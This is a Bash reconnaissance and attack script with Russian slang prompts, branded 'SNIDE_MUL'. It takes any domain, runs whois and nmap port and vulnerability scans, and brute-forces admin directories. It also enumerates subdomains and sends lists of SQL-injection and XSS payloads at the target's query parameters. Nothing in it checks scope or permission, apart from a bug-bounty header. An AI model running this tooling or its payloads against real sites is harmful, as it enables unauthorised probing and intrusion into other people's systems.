#!/bin/bash

for cmd in nmap whois gobuster curl; do
    if ! command -v $cmd &> /dev/null; then
      echo "[!] Сначала $cmd  поставь олух"
      exit 1
   fi
done
# --- 1. ХАКЕРСКИЙ БАННЕР ---
clear
echo -e "\e[1;35m"
echo "========================================="
echo "             SNIDE_M U L   v2.5          "
echo "========================================="
echo -e "\e[0m"

# --- 1.5. ПАСПОРТ ИССЛЕДОВАТЕЛЯ BUG BOUNTY ---
BB_USER="ТВОЙ_НИК"
BB_HEADER="X-Bug-Bounty: $BB_USER"

# --- 2. ИНТЕРАКТИВНЫЙ ВВОД С АВТО-ОЧИСТКОЙ ---
read -p "По кому работаем? " RAW_TARGET
if [ -z "$RAW_TARGET" ]; then
    echo "И где?"
    exit 1
fi

TARGET=$(echo "$RAW_TARGET" | sed -e 's|^[^/]*//||' -e 's|/.*||')
echo ""

# --- 3. АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА (РУФИКАЦИЯ) ---
if [[ "$TARGET" =~ \.(ru|su|рф)$ ]]; then
    echo "[!] Обнаружена зона RU/SU. Активирую режим обхода фаерволов..."
    echo "Провайдер зажал пинги?(Адай быля)"
    PING_TIME="Запрещено(Для верификации скачайте МАКС)"
    NMAP_FLAGS="-sT -Pn" 
else
    echo "ПЕНДОСЫ"
    echo -n "Секунду,Секунду... "
    PING_TIME=$(ping -c 1 "$TARGET" 2>/dev/null | grep -o "time=[0-9.]* ms")
    
    if [ -z "$PING_TIME" ]; then
        if curl --connect-timeout 3 --silent --head -H "$BB_HEADER" "http://$TARGET" > /dev/null; then
            PING_TIME="через веб ответил (ICMP заблочен)"
        else
            echo -e "\e[1;31m[!] Ой, а он умер крч... Сливаемся.\e[0m"
            exit 1
        fi
    fi
    NMAP_FLAGS="-Pn" 
fi

echo "Во..."
echo "--> Статус цели: $PING_TIME"
echo ""

# --- 4. ПРОБИВКА ПО БАЗАМ (GEO & ISP) ---
echo -n "(Деаноним)... Во: "
WHOIS_DATA=$(whois "$TARGET" 2>/dev/null)
COUNTRY=$(echo "$WHOIS_DATA" | grep -i "^country:" | head -n 1 | awk '{print $2}')

if [ -z "$COUNTRY" ]; then
    COUNTRY=$(echo "$WHOIS_DATA" | grep -i "descr:" | head -n 1 | awk '{$1=""; print $0}' | sed 's/^[ \t]*//')
fi

ISP=$(echo "$WHOIS_DATA" | grep -E -i "OrgName:|netname:|descr:" | head -n 1 | awk -F: '{print $2}' | sed 's/^[ \t]*//')

echo "--> Страна: ${COUNTRY:-Че-то скрытный сервак}"
echo "--> Провайдер: ${ISP:-Какая-то ноунейм сеть}"
echo ""

# --- 5. СКАНИРОВАНИЕ ПОРТОВ ---
echo -n "(Сейчас приконектимся)... Щя...Щя...Щя...Щя...Во: "
nmap -p 80,443,22,8080 $NMAP_FLAGS --script-args http.useragent="$BB_HEADER" "$TARGET" > /tmp/nmap_res.txt

PORTS=$(grep "open" /tmp/nmap_res.txt)
echo "--> Порты: "
if [ -z "$PORTS" ]; then
    echo "    Блин, всё закрыто. Сюда не залезть."
else
    echo "$PORTS" | awk '{print "    Вот все что есть: " $1 " (" $3 ")"}'
fi
echo ""

# --- 5.5. БОГАТЫЙ ВЫБОР ОРУЖИЯ ---
echo "========================================="
echo "   БОГАТЫЙ ВЫБОР ОРУЖИЯ:"
echo "========================================="
echo "1) Проверить цель на жесткие уязвимости (NSE)"
echo "2) Найти скрытые папки и админки (Dir-brute)"
echo "3) Пробить версии софта и операционку (Banner Grab)"
echo "4) Найти скрытые поддомены (Subfinder)"
echo "5) Тест на SQL-инъекции (SQLi PRO)"
echo "6) Тест на уязвимость XSS (XSS PRO)"
echo "========================================="
read -p "Че берем? " ATK_CHOICE

if [ "$ATK_CHOICE" = "1" ]; then
    echo ""
    echo "Щя чекнем как они защитились..."
    VULN_RES=$(nmap --script=vuln -p 80,443 $NMAP_FLAGS --script-args http.useragent="$BB_HEADER" "$TARGET" | grep -E "VULNERABLE|State:|IDs:")
    echo ""
    if [ -z "$VULN_RES" ]; then
        echo "Админ не лох."
    else
        echo "Опа..."
        echo "$VULN_RES"
    fi
    echo ""
    echo "[+] Сканирование на уязвимости окончено!"

elif [ "$ATK_CHOICE" = "2" ]; then
    echo ""
    echo "Щя проверим как они защитились..."
    echo -e "admin\nlogin\nsecret\nbackup\ndb\nwp-admin\nconfig" > /tmp/mini_wordlist.txt
    BRUTE_RES=$(gobuster dir -u "http://$TARGET" -w /tmp/mini_wordlist.txt -H "$BB_HEADER" --quiet 2>/dev/null | grep "Status: 200\|Status: 301")
    echo ""
    if [ -z "$BRUTE_RES" ]; then
        echo "--> Оказалось они не дибилы"
    else
        echo "Опа..."
        echo "$BRUTE_RES"
    fi
    echo ""
    echo "[+] Готовчинко"

elif [ "$ATK_CHOICE" = "3" ]; then
    echo ""
    echo "Щя узнаем с чего сидят..."
    echo "Ты глянь:"
    SOFT_RES=$(nmap -sV -O $NMAP_FLAGS --osscan-limit --script-args http.useragent="$BB_HEADER" "$TARGET" 2>/dev/null)
    echo ""
    SERVICE_LINES=$(echo "$SOFT_RES" | grep -E "tcp|udp" | grep "open")
    OS_LINE=$(echo "$SOFT_RES" | grep "Running:" | awk -F: '{print $2}')
    
    if [ -z "$SERVICE_LINES" ]; then
        echo "Оказывается они не дибилы..."
    else
        echo "$SERVICE_LINES" | awk '{print "    • Тут короче на: " $1 " висит: " $4 " " $5 " " $6}'
        if [ ! -z "$OS_LINE" ]; then
            echo "    • Похоже, там установлена ОС:$OS_LINE"
        fi
    fi
    echo ""
    echo "[+] Снятие баннеров окончено!"

elif [ "$ATK_CHOICE" = "4" ]; then
    echo ""
    echo "Щас как найдем..."
    SUB_RES=$(subfinder -d "$TARGET" -silent 2>/dev/null)
    echo ""
    if [ -z "$SUB_RES" ]; then
        echo "Не бойся когда ты один, бойся когда ты два..."
    else
        echo "Опа..."
        echo "$SUB_RES" | awk '{print "     Поддомен: " $1}'
        echo "$SUB_RES" > ~/Desktop/${TARGET}_subdomains.txt
        echo ""
        echo "[!] Все здесь: ~/Desktop/${TARGET}_subdomains.txt"
    fi
    echo ""
    echo "[+] Разведка поддоменов окончено!"

elif [ "$ATK_CHOICE" = "5" ]; then
    echo ""
    echo "Щя все будет..."
    
    SQL_PAYLOADS=(
        "'" 
        "\"" 
        "' OR 1=1 --" 
        "\" OR \"1\"=\"1" 
        "' OR '1'='1" 
        "admin' --" 
        "1 AND 1=1"
        "' UNION SELECT NULL--"
    )
    
    VULN_FOUND=0
    for PAYLOAD in "${SQL_PAYLOADS[@]}"; do
        echo -n "Пробую: $PAYLOAD ... "
        ENCODED=$(echo -n "$PAYLOAD" | sed 's/ /%20/g; s/	/%09/g; s/'\''/%27/g; s/"/%22/g')
        
        SQL_CHECK=$(curl --connect-timeout 4 --silent -H "$BB_HEADER" "http://$TARGET/?id=$ENCODED" "http://$TARGET/?search=$ENCODED" 2>&1)
        
        if echo "$SQL_CHECK" | grep -E -i "SQL syntax|mysql_fetch|database error|PostgreSQL|ORA-|Driver|SQLite|syntax error" > /dev/null; then
            echo -e "\e[1;31m[+破] Ага!  Пейлоад: $PAYLOAD \e[0m"
            VULN_FOUND=1
        else
            echo "Мимо"
        fi
    done

    echo ""
    if [ "$VULN_FOUND" -eq 1 ]; then
        echo -e "\e[1;32m[!] Цель имеет признаки SQLi! Крути параметры руками или пиши репорт.\e[0m"
    else
        echo "Защитились("
    fi
    echo ""
    echo "[+] SQL тест окончен!"

elif [ "$ATK_CHOICE" = "6" ]; then
    echo ""
    echo "Ну-ка мы его..."
    XSS_PAYLOADS=(
        "<script>alert('SNIDE')</script>" 
        "\"><script>alert(1)</script>"
        "<img src=x onerror=alert('SNIDE')>" 
        "javascript:alert(1)"
        "<svg/onload=alert(1)>"
        "';alert(1);//" 
        "<sCrIpT>alert('SNIDE')</sCrIpT>"
        "<video><source onerror=alert('SNIDE')>"
        "<iframe src=javascript:alert(1)>" 
        "\"-alert('SNIDE')-\""
    )

    VULN_FOUND=0
    for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
        echo -n "Засылаю: $PAYLOAD ... "
        ENCODED=$(echo -n "$PAYLOAD" | sed 's/ /%20/g; s/</%3C/g; s/>/%3E/g; s/"/%22/g; s/'\''/%27/g')
        
        XSS_CHECK=$(curl --connect-timeout 4 --silent -H "$BB_HEADER" "http://$TARGET/?search=$ENCODED" "http://$TARGET/?q=$ENCODED")
        
        if echo "$XSS_CHECK" | grep -F "$PAYLOAD" > /dev/null; then
            echo -e "\e[1;31m[+💥] СРАБОТАЛО! Пейлоад вернулся в код без очистки!\e[0m"
            VULN_FOUND=1
        else
            echo "Отфильтровано"
        fi
    done

    echo ""
    if [ "$VULN_FOUND" -eq 1 ]; then
        echo -e "\e[1;32m[!] Обнаружена XSS! Попробуй открыть эту ссылку в браузере.\e[0m"
    else
        echo "Не оч получилось..."
    fi
    echo ""
    echo "[+] XSS тест окончен!"

else
    echo ""
    echo "Ну и ладно"
fi

echo "========================================="
echo "       Я все проверил, я молодец.        "
echo "========================================="
read PEPE
if [ "$PEPE" = "a" ]; then
    echo "лин ган гулу гулу гулу вата лин ган гу лин ган гу"
    echo " "
fi
